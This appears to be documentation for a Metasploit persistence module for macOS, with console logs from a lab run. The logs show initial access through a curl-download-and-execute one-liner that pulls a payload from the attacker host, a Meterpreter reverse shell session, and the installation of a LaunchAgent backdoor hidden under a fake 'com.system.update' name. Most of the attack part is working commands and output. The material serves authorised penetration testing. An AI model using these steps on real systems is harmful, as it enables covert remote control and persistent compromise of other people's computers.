## Vulnerable Application

This module provides a persistent boot payload by creating a launch item, which can be
a LaunchAgent or a LaunchDaemon. LaunchAgents run with user level permissions and are triggered
upon login by a plist entry in `~/Library/LaunchAgents`. LaunchDaemons run with
elevated privilleges, and are launched before user login by a plist entry in the `~/Library/LaunchDaemons` directory.
In either case the plist entry specifies an executable that will be run before or at login.

Verified on OSX 11.7.10 (Big Sur)

## Verification Steps

1. Start msfconsole
1. Get a shell
1. Do: `use exploit/osx/persistence/launch_plist`
1. Do: `run`
1. You should get a shell.

## Options

### BACKDOOR_PATH

Path to hide the backdoor on the target. Defaults to `~/Library/.<random>/com.system.update`

### KEEPALIVE

Continually restart the payload exe if it crashes/exits. Defaults to `true`

### RUN_NOW

Run the installed payload immediately. Defaults to `false`

### LAUNCH_ITEM

Type of launch item, see description for more info. Choices are `LaunchAgent`, `LaunchDaemon`. Default is `LaunchAgent`

## Scenarios

### 11.7.10 (Big Sur)

Initial access vector via web delivery

```
resource (/home/h00die/.msf4/msfconsole.rc)> setg verbose true
verbose => true
resource (/home/h00die/.msf4/msfconsole.rc)> setg lhost 192.168.2.128
lhost => 192.168.2.128
resource (/home/h00die/.msf4/msfconsole.rc)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (/home/h00die/.msf4/msfconsole.rc)> set srvport 8181
srvport => 8181
resource (/home/h00die/.msf4/msfconsole.rc)> set target 7
target => 7
resource (/home/h00die/.msf4/msfconsole.rc)> set lport 4545
lport => 4545
resource (/home/h00die/.msf4/msfconsole.rc)> set URIPATH l
URIPATH => l
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set target 8
target => 8
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set payload payload/osx/x64/meterpreter/reverse_tcp
payload => osx/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 192.168.2.128:4545 
[*] Using URL: http://192.168.2.128:8181/l
[*] Server started.
[*] Run the following command on the target machine:
curl -sk --output DZUIk3jn http://192.168.2.128:8181/l; chmod +x DZUIk3jn; ./DZUIk3jn& disown
[*] 192.168.2.51     web_delivery - Delivering Payload (17204 bytes)
[*] Transmitting first stager...(214 bytes)
[*] Transmitting second stager...(49152 bytes)
[*] Sending stage (815032 bytes) to 192.168.2.51
[*] Meterpreter session 2 opened (192.168.2.128:4545 -> 192.168.2.51:61809) at 2025-02-16 12:35:40 -0500

[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > sessions -i 2
[*] Starting interaction with 2...

(Meterpreter 2)(/Users/h00die) > getuid
Server username: h00die
(Meterpreter 2)(/Users/h00die) > sysinfo
Computer     : h00dies-MacBook-Pro.local
OS           : macOS Big Sur (macOS 11.7.10)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx
(Meterpreter 2)(/Users/h00die) > background
[*] Backgrounding session 2...
```

Persistence

```
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > use exploit/osx/persistence/launch_plist 
[*] No payload configured, defaulting to osx/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:1) exploit(osx/persistence/launch_plist) > set session 2
session => 2
[msf](Jobs:1 Agents:1) exploit(osx/persistence/launch_plist) > exploit
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
[msf](Jobs:2 Agents:1) exploit(osx/persistence/launch_plist) > 
[*] Started reverse TCP handler on 192.168.2.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. /Users/h00die/Library is writable
[-] Exploit aborted due to failure: unknown: Duplicate LaunchAgent plist already exists at /Users/h00die/Library/LaunchAgents/com.system.update.plist

[msf](Jobs:1 Agents:1) exploit(osx/persistence/launch_plist) > exploit
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.
[msf](Jobs:2 Agents:1) exploit(osx/persistence/launch_plist) > 
[*] Started reverse TCP handler on 192.168.2.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. /Users/h00die/Library is writable
[*] Dropping backdoor executable...
[+] Backdoor stored to /Users/h00die/Library/.OMZztqEV/com.system.update
[+] LaunchAgent added: /Users/h00die/Library/LaunchAgents/com.system.update.plist
[+] LaunchAgent installed successfully.
[*] To remove the persistence, run:
rm -rf /Users/h00die/Library/.OMZztqEV ; rm /Users/h00die/Library/LaunchAgents/com.system.update.plist ; launchctl remove com.system.update ; launchctl stop com.system.update

[*] Meterpreter-compatible Cleaup RC file: /home/h00die/.msf4/logs/persistence/h00dies-MacBook-Pro.local_20250216.3727/h00dies-MacBook-Pro.local_20250216.3727.rc
```
